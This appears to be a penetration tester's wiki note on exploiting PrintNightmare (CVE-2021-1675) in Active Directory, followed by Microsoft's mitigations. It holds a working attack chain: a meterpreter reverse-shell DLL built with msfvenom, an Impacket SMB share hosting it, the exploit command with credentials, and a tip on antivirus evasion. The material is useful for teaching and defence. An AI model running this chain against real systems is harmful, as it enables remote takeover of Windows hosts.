#Active-Directory #Post-Exploitation 

# PrintNightmare

PrintNightmare (CVE-2021-1675) abuses a vulnerability in the "Print Spooler" service to inject and execute malicious DLL libraries for various purposes (escalated foothold, adding users, etc).

- Python and C# version on [Github](https://github.com/cube0x0/CVE-2021-1675)
- Powershell (Local Privilege Escalation) version on [Github](https://github.com/calebstewart/CVE-2021-1675)

### Prior Checks
Even patched, if the following queries returns the expected value, the target is open for exploitation:
``` shell
# Query registry value on target
> REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint
    RestrictDriverInstallationToAdministrators    REG_DWORD    0x0
    NoWarningNoElevationOnInstall    REG_DWORD    0x1

# `rpcdump` from Impacket suite
> rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

### PrintNIghtmare and `meterpreter` for Escalated Foothold
- Create a malicious DLL payload for a reverse shell
		- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Listening IP> LPORT=<Listening Port> -f dll > shell.dll`
- Host the payload on a dummy share for easy access (with SMB 2 support)
		- `smbserver <Share Name> <Local path to host> -smb2support` (`smbserver` of the Impacket suite)
- Use `multi/handler` module of Metasploit to listen for incoming connections
- Exploit
		- `CVE-2021-1675.py <domain>/<user>:<password>@<target IP> '\\UNC\to\payload'`

The attack can trigger AV filters, steps have to be taken to obfuscate the payload or attempt other AV evasion techniques.

### Defensive measures
-> Extracted from [Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)

**Determine if the Print Spooler service is running**

Run the following in Windows PowerShell:

`Get-Service -Name Spooler`

If the Print Spooler is running or if the service is not set to disabled, select one of the following options to either disable the Print Spooler service, or to Disable inbound remote printing through Group Policy:

**Option 1 - Disable the Print Spooler service**

If disabling the Print Spooler service is appropriate for your enterprise, use the following PowerShell commands:

`Stop-Service -Name Spooler -Force`

`Set-Service -Name Spooler -StartupType Disabled`

**Impact of workaround** Disabling the Print Spooler service disables the ability to print both locally and remotely.

**Option 2 - Disable inbound remote printing through Group Policy**

You can also configure the settings via Group Policy as follows:

Computer Configuration / Administrative Templates / Printers

Disable the “Allow Print Spooler to accept client connections:” policy to block remote attacks.

You must restart the Print Spooler service for the group policy to take effect.

**Impact of workaround** This policy will block the remote attack vector by preventing inbound remote printing operations. The system will no longer function as a print server, but local printing to a directly attached device will still be possible.

